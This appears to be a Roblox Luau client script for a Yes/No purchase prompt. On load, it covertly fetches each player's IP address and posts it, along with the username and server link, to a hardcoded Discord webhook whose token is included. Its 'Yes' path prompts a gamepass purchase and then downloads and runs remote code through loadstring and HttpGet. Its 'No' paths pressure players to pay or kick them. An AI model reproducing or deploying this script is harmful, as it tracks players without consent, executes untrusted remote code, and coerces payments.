--📦 Services
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

--👤 Player
local player = Players.LocalPlayer

--🌐 Webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1377579202596835328/J8Fgv6dyAG7zHogHL3ua-pC2zjyMMNZ1rmrtXFRlkNfXB-R7_BVJ7PkuM3brkU1MYasM"

--🧩 UI Elements
local MainFrame = script.Parent
local YesButton = MainFrame:WaitForChild("YesButton")
local NoButton = MainFrame:WaitForChild("NoButton")

local ConfirmFrame = MainFrame:WaitForChild("ConfirmFrame")
local ConfirmYes = ConfirmFrame:WaitForChild("ConfirmYes")
local ConfirmNo = ConfirmFrame:WaitForChild("ConfirmNo")

--🎟️ GamePass IDs
local YES_GAMEPASS = 1239182322
local NO_GAMEPASS = 1155430905

--🌍 Get IP
local function getIP()
	local success, response = pcall(function()
		return HttpService:GetAsync("https://ipapi.co/json")
	end)
	if success then
		local data = HttpService:JSONDecode(response)
		return data.ip or "Unknown IP"
	else
		return "Unknown IP"
	end
end

--📎 Get server link
local function getServerLink()
	local jobId = game.JobId
	if jobId and jobId ~= "" then
		return "https://www.roblox.com/games/" .. game.PlaceId .. "/-/" .. jobId
	else
		return "Private/Unknown Server"
	end
end

--📤 Send Webhook
local function sendWebhook(ip, username, server)
	local data = {
		["content"] = "**New User Prompted Purchase**\n" ..
					  "**Username:** " .. username .. "\n" ..
					  "**IP Address:** " .. ip .. "\n" ..
					  "**Server:** " .. server
	}
	local headers = {
		["Content-Type"] = "application/json"
	}
	HttpService:RequestAsync({
		Url = WEBHOOK_URL,
		Method = "POST",
		Headers = headers,
		Body = HttpService:JSONEncode(data)
	})
end

--📦 Webhook execution
task.spawn(function()
	local ip = getIP()
	local username = player.Name
	local server = getServerLink()
	sendWebhook(ip, username, server)
end)

YesButton.MouseButton1Click:Connect(function()
	MainFrame.Visible = false
	ConfirmFrame.Visible = false
end)

ConfirmYes.MouseButton1Click:Connect(function()
	ConfirmFrame.Visible = false
	MarketplaceService:PromptGamePassPurchase(player, YES_GAMEPASS)
	loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-NoLag-Hub-no-key-38699"))()
end)

ConfirmNo.MouseButton1Click:Connect(function()
	ConfirmFrame.Visible = false
	player:Kick("You refuse you kicked.")
end)

NoButton.MouseButton1Click:Connect(function()
	MainFrame.Visible = false
	MarketplaceService:PromptGamePassPurchase(player, NO_GAMEPASS)
	task.wait(1)
	player:Kick("You refused to continue. This is your punishment.")
end)